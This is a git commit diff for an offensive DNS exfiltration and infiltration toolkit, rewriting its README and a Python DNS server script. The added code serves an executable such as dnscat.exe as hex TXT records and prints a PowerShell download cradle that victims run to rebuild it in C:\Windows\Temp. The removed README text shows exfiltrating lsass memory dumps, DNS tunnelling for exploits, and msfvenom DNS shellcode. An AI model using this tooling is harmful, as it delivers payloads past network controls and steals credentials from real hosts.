4a918c4c5268b7866c3f23cb2ec7373794d9c357
Sam Freeside <snovvcrash@protonmail.ch>
2023-12-20 11:01:47 +0300

    Add dns_upload.py mods

--- README.md
+++ README.md
@@ -1,67 +1,26 @@
-# GPL
+# exfiltrate
 
 Correct `yourzone.tk`.
 
-### Infiltration (File upload)
-
-Change loops count (ex. 1190) in `dns_download.vbs` before running.
-```
-attacker> sudo ./dns_upload.py --udp --file dnscat.exe
-victim> cscript.exe dns_download.vbs
-victim> ./dns_download.sh attacker.tk 1190 /tmp/dnscat
-```
-
-### Exfiltration (File download)
+## General DNS Setup
 
 ```
-attacker> sudo ./dns_download.py --udp --file lsass.mdmp
-victim> cscript.exe dns_upload.vbs c:\path\to\lsass.mdmp attacker.tk
+A * -> <IP>
+A @ -> <IP>
+A vps -> <IP>
+NS dns -> vps.yourzone.tk
 ```
 
-### Dns-to-Tcp [WIP]
+## Infiltration (File Upload)
 
-```
-victim> set TIMEOUT=1000
-victim> set DNS_SIZE=50
-victim> dns_tcp.exe c 127.0.0.1 445
-attacker> sudo ./dns_tcp.py --udp --port 53 -l 445
-attacker> exploit.py localhost 445
+Attacker:
+
+```bash
+$ sudo ./dns_upload.py dns.yourzone.tk --udp --file dnscat.exe -o/--output 'C:\Windows\Temp\dnscat.exe' [-s/--sleep 300]
 ```
 
-### Dns-Shellcode
-It can be used as dns-shellcode alternative for exploiting isolated hosts:
-```
-msfvenom -p windows/exec CMD=$(cat dns_download_exec.bat) -f raw -o dns_shellcode
-msfvenom -p linux/x86/exec CMD=$(cat dns_download_exec.sh) -f raw -o dns_shellcode
-```
+Victim:
 
-### QR exfiltration (File upload)
-For RDP (windows):
-```
-cl /c lib\qrcodegen.c
-cl /c qr_upload.c
-link /out:qr_upload.exe qr_upload.obj qrcodegen.obj
-chcp 866
-set TIMEOUT=1000
-set SIZE=100
-qr_upload.exe c:\path\to\secret.bin
-```
-For telnet (routers, etc):
-```
-gcc -c lib/qrcodegen.c
-gcc -c qr_upload.c
-gcc qr_upload.c qrcodegen.o -o qr_upload
-setterm -background white
-setterm -foreground black
-TIMEOUT=1000 SIZE=100 ./qr_upload /path/to/secret.bin
-```
-Attacker side:
-`./qr_download.py`
-
-### Sendkeys (File download)
-If nothing works you can always fill text (universal):
-```
-setxkbmap us
-cat /tmp/test.txt | ./text_send.sh
-cat /tmp/test.bin | base64 | ./text_send.sh
+```powershell
+PS > for($d=1;$d -le 1190;$d++){while (1){try{$a=(Resolve-DnsName "d$d.dns.yourzone.tk" -Type TXT -Server 1.1.1.1 -ErrorAction Stop).Strings}catch{continue};break};$b=@();for($i=0;$i -le "$a".Length-1;$i=$i+2){$b+=[convert]::ToByte($a.Substring($i,2),16)};while(1){Sleep -mi 300;try{Add-Content "C:\Windows\Temp\dnscat.exe" -Value $b -Encoding Byte -ErrorAction Stop}catch{continue};break}}
 ```
--- dns_upload.py
+++ dns_upload.py
@@ -1,83 +1,25 @@
 #!/usr/bin/env python3
-# coding=utf-8
 
-import argparse
-import datetime
 import sys
 import time
+import struct
+import hashlib
+import argparse
+import datetime
 import threading
 import traceback
 import socketserver
-import struct
+
 try:
     from dnslib import *
 except ImportError:
     print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
-    sys.exit(2)
+    sys.exit(1)
 
 
 class DomainName(str):
     def __getattr__(self, item):
         return DomainName(item + '.' + self)
-
-
-D = DomainName('yourzone.tk.')
-IP = '127.0.0.1'
-TTL = 60 * 5
-
-soa_record = SOA(
-    mname=D.ns1,  # primary name server
-    rname=D.andrei,  # email of the domain administrator
-    times=(
-        201307231,  # serial number
-        60 * 60 * 1,  # refresh
-        60 * 60 * 3,  # retry
-        60 * 60 * 24,  # expire
-        60 * 60 * 1,  # minimum
-    )
-)
-ns_records = [NS(D.ns1), NS(D.ns2)]
-records = {
-    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
-    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
-    D.ns2: [A(IP)],
-    D.mail: [A(IP)],
-    D.andrei: [CNAME(D)],
-}
-
-
-def dns_response(data):
-    request = DNSRecord.parse(data)
-
-    #print(request)
-
-    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
-
-    qname = request.q.qname
-    qn = str(qname).lower()
-    print(qn, end=" -> ")
-    qtype = request.q.qtype
-    qt = QTYPE[qtype]
-
-    if qn == D or qn.endswith('.' + D):
-
-        for name, rrs in records.items():
-            if name == qn:
-                for rdata in rrs:
-                    rqt = rdata.__class__.__name__
-                    if qt in ['*', rqt]:
-                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
-                        print(rdata, end="")
-
-        for rdata in ns_records:
-            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
-
-        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
-
-    #print("---- Reply:\n", reply)
-    print(" ok")
-
-    return reply.pack()
 
 
 class BaseRequestHandler(socketserver.BaseRequestHandler):
@@ -90,13 +32,8 @@ class BaseRequestHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
         now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-        '''
-        print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
-                                               self.client_address[1]))
-        '''
         try:
             data = self.get_data()
-            #print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
             self.send_data(dns_response(data))
         except Exception:
             traceback.print_exc(file=sys.stderr)
@@ -121,49 +58,111 @@ class TCPRequestHandler(BaseRequestHandler):
 class UDPRequestHandler(BaseRequestHandler):
 
     def get_data(self):
-        return self.request[0]#.strip()
+        return self.request[0]
 
     def send_data(self, data):
         return self.request[1].sendto(data, self.client_address)
 
 
+def dns_response(data):
+    request = DNSRecord.parse(data)
+    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+
+    qname = request.q.qname
+    qn = str(qname).lower()
+
+    print(f'[+] {qn.rstrip(".")}', end='\r')
+
+    qtype = request.q.qtype
+    qt = QTYPE[qtype]
+
+    if qn == D or qn.endswith('.' + D):
+        for name, rrs in records.items():
+            if name == qn:
+                for rdata in rrs:
+                    rqt = rdata.__class__.__name__
+                    if qt in ['*', rqt]:
+                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
+
+        for rdata in ns_records:
+            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
+
+        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
+
+    return reply.pack()
+
+
 def main():
-    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python.')
-    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python. Usually DNSs use UDP on port 53.')
-    parser.add_argument('--port', default=53, type=int, help='The port to listen on.')
-    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
-    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
-    parser.add_argument('--file', help='Sended file')
-    
+    parser = argparse.ArgumentParser(description='A DNS server in Python.')
+    parser.add_argument('name_server', help='NS domain name')
+    parser.add_argument('--port', default=53, type=int, help='port to listen on')
+    parser.add_argument('--tcp', action='store_true', help='listen for TCP connections')
+    parser.add_argument('--udp', action='store_true', help='listen for UDP datagrams')
+    parser.add_argument('--file', help='the file to send')
+    parser.add_argument('-s', '--sleep', default='300', help='delay between DNS requests')
+    parser.add_argument('-o', '--output', default=r'C:\Windows\Temp\test.exe', help='output file path')
+
     args = parser.parse_args()
-    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")
+    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp options")
+
+    global D
+    global TTL
+    global soa_record
+    global ns_records
+    global records
+
+    D = DomainName(f'{args.name_server}.')
+    IP = '127.0.0.1'
+    TTL = 60 * 5
+
+    soa_record = SOA(
+        mname=D.ns1,
+        rname=D.root,
+        times=(
+            201307231,
+            60 * 60 * 1,
+            60 * 60 * 3,
+            60 * 60 * 24,
+            60 * 60 * 1,
+        )
+    )
+    ns_records = [NS(D.ns1), NS(D.ns2)]
+
+    records = {
+        D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
+        D.ns1: [A(IP)],
+        D.ns2: [A(IP)],
+        D.mail: [A(IP)],
+        D.root: [CNAME(D)],
+    }
 
     with open(args.file, 'rb') as f:
-        file_bytes = f.read()
-        i = 1
-        for part in range(0,len(file_bytes),126):
-            print("[*] 'd{n}.txt.yourzone.tk.' = {txt}".format(n=i, txt=file_bytes[part:part+126].hex()))
-            records[ DomainName('d%d.txt.yourzone.tk.' % i) ] = [TXT("?" + file_bytes[part:part+126].hex())]
-            i += 1
+        data = f.read()
+        print(f'[*] {args.file} SHA256: {hashlib.sha256(data).hexdigest()}')
 
-    print("Starting nameserver...")
+        i = 0
+        for chunk in range(0, len(data), 126):
+            i += 1
+            #print(f"[*] 'd{i}.{args.name_server}.' = {data[chunk:chunk+126].hex()}")
+            records[DomainName(f'd{i}.{args.name_server}.')] = [TXT(data[chunk:chunk + 126].hex())]
+
+    print(f"""[*] PS cradle:\n\nfor($d=1;$d -le {i};$d++){{while (1){{try {{$a=(Resolve-DnsName "d$d.{args.name_server}" -Type TXT -Server 1.1.1.1 -ErrorAction Stop).Strings}}catch{{continue}};break}};$b = @();for ($i=0;$i -le "$a".Length-1;$i=$i+2){{$b+=[convert]::ToByte($a.Substring($i,2),16)}};while (1){{Sleep -mi {args.sleep};try {{Add-Content "{args.output}" -Value $b -Encoding Byte -ErrorAction Stop}}catch {{continue}};break}}}}\n""")
+    print(f'[*] Total DNS requests: {i}')
 
     servers = []
     if args.udp: servers.append(socketserver.ThreadingUDPServer(('', args.port), UDPRequestHandler))
     if args.tcp: servers.append(socketserver.ThreadingTCPServer(('', args.port), TCPRequestHandler))
 
     for s in servers:
-        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
-        thread.daemon = True  # exit the server thread when the main thread terminates
+        thread = threading.Thread(target=s.serve_forever)
+        thread.daemon = True
         thread.start()
-        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
 
     try:
-        while 1:
+        while True:
             time.sleep(1)
             sys.stderr.flush()
             sys.stdout.flush()
-
     except KeyboardInterrupt:
         pass
     finally:
@@ -172,4 +171,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
